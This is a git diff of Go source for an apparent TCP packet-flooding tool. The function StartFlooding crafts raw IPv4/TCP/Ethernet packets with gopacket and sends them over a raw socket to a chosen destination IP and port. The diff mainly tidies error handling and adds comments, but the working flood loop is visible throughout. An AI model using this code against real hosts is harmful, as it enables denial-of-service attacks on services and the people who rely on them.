@@ -67,52 +67,52 @@ func StartFlooding(dstIpStr string, dstPort, payloadLength int) {
 			FixLengths:       true,
 			ComputeChecksums: true,
 		}
-		err = ipPacket.SerializeTo(ipHeaderBuf, opts)
-		if err != nil {
+
+		if err = ipPacket.SerializeTo(ipHeaderBuf, opts); err != nil {
 			panic(err)
 		}
+
 		ipHeader, err := ipv4.ParseHeader(ipHeaderBuf.Bytes())
 		if err != nil {
 			panic(err)
 		}
+
 		tcpPayloadBuf := gopacket.NewSerializeBuffer()
 		payload := gopacket.Payload(payload)
-		err = gopacket.SerializeLayers(tcpPayloadBuf, opts, ethernetLayer, tcpPacket, payload)
-		if err != nil {
+
+		if err = gopacket.SerializeLayers(tcpPayloadBuf, opts, ethernetLayer, tcpPacket, payload); err != nil {
 			panic(err)
 		}
 
 		// XXX send packet
 		var packetConn net.PacketConn
 		var rawConn *ipv4.RawConn
-		packetConn, err = net.ListenPacket("ip4:tcp", "0.0.0.0")
-		if err != nil {
-			panic(err)
-		}
-		rawConn, err = ipv4.NewRawConn(packetConn)
-		if err != nil {
+
+		if packetConn, err = net.ListenPacket("ip4:tcp", "0.0.0.0"); err != nil {
 			panic(err)
 		}
 
-		err = rawConn.WriteTo(ipHeader, tcpPayloadBuf.Bytes(), nil)
-		if err != nil {
+		if rawConn, err = ipv4.NewRawConn(packetConn); err != nil {
 			panic(err)
 		}
 
-		// log.Printf("packet of length %d sent!\n", len(tcpPayloadBuf.Bytes()) + len(ipHeaderBuf.Bytes()))
+		if err = rawConn.WriteTo(ipHeader, tcpPayloadBuf.Bytes(), nil); err != nil {
+			panic(err)
+		}
+
 		logger.Info("packet sent!", zap.String("srcPort", tcpPacket.SrcPort.String()),
 			zap.String("dstPort", tcpPacket.DstPort.String()),
 			zap.String("srcIp", ipPacket.SrcIP.String()),
 			zap.Uint16("length", ipPacket.Length),
 			zap.String("dstIp", ipPacket.DstIP.String()))
-		err = bar.Add(payloadLength)
-		if err != nil {
+
+		if err = bar.Add(payloadLength); err != nil {
 			panic(err)
 		}
 	}
 }
 
-// build raw/ip packet
+// buildIpPacket generates a layers.IPv4 and returns it with source IP address and destination IP address
 func buildIpPacket(srcIpStr, dstIpStr string) *layers.IPv4 {
 	return &layers.IPv4{
 		SrcIP: net.ParseIP(srcIpStr).To4(),
@@ -123,7 +123,7 @@ func buildIpPacket(srcIpStr, dstIpStr string) *layers.IPv4 {
 	}
 }
 
-// build tcp packet
+// buildTcpPacket generates a layers.TCP and returns it with source port and destination port
 func buildTcpPacket(srcPort, dstPort int) *layers.TCP {
 	return &layers.TCP{
 		SrcPort: layers.TCPPort(srcPort),
@@ -139,6 +139,7 @@ func buildTcpPacket(srcPort, dstPort int) *layers.TCP {
 	}
 }
 
+// buildEthernetPacket generates an layers.Ethernet and returns it with source MAC address and destination MAC address
 func buildEthernetPacket(srcMac, dstMac []byte) *layers.Ethernet {
 	return &layers.Ethernet{
 		SrcMAC: net.HardwareAddr{srcMac[0], srcMac[1], srcMac[2], srcMac[3], srcMac[4], srcMac[5]},
